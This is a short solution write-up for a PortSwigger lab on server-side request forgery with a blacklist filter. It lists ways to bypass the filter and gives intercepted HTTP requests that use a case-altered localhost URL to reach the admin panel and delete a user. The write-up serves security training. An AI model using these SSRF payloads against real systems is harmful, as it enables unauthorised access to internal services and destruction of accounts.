# [Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

## Lab

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

## Analysis

The blacklist method has an inherited weakness: incomplete blacklist vulnerability.

Bypass:

- Using an alternative IP representation of `127.0.0.1`: such as `2130706433`, `017700000001`, or `127.1`.
- Registering your own domain name that resolves to 127.0.0.1. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscating blocked strings using URL encoding or case variation.

## Exploit

1. burp's intercept:

    ```http
    POST /product/stock HTTP/1.1
    Host: 0a34000e0453e884c1de856c003300a9.web-security-academy.net
    ...

    stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1  
    ```

2. burp's repeater:

    ```http
    POST /product/stock HTTP/1.1
    Host: 0a63002b0443cd0cc3510b50006c0059.web-security-academy.net
    ...

    stockApi=http%3a//localhosT/admiN
    ```

    => bypassed

3. Solve lab:

```http
POST /product/stock HTTP/1.1
Host: 0a34000e0453e884c1de856c003300a9.web-security-academy.net

stockApi=http%3a//localhosT/admiN/delete?username=carlos
```
